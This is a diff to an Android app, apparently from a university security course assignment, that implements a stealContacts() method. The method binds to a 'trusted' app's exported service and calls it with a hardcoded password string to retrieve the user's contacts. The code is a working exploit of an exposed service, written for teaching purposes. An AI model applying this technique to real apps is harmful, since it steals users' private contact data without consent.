@@ -1,8 +1,16 @@
 package com.cs155.evilapp;
 
 import com.cs155.evilapp.R;
+import com.cs155.trustedapp.IGetContactsString;
+
 import android.os.Bundle;
+import android.os.IBinder;
+import android.os.RemoteException;
 import android.app.Activity;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.content.ServiceConnection;
 import android.util.Log;
 import android.view.View;
 import android.view.View.OnClickListener;
@@ -45,5 +53,23 @@ public class MainActivity extends Activity {
 
     private void stealContacts() {
 	// TODO: your implementation here
+    	ServiceConnection mConnection = new ServiceConnection() {
+            public void onServiceConnected(ComponentName className, IBinder service) {
+                IGetContactsString mService = IGetContactsString.Stub.asInterface(service);
+
+                try {
+					String contacts = mService.GetContacts("youllnevergetmeluckycharms");
+					showContacts(contacts);
+				} catch (RemoteException e) {
+					e.printStackTrace();
+				}
+            }
+
+            public void onServiceDisconnected(ComponentName className) {
+                
+            }
+        };
+        
+        bindService(new Intent("com.cs155.trustedapp.ReadContactsService"), mConnection, Context.BIND_AUTO_CREATE);
     }
 }
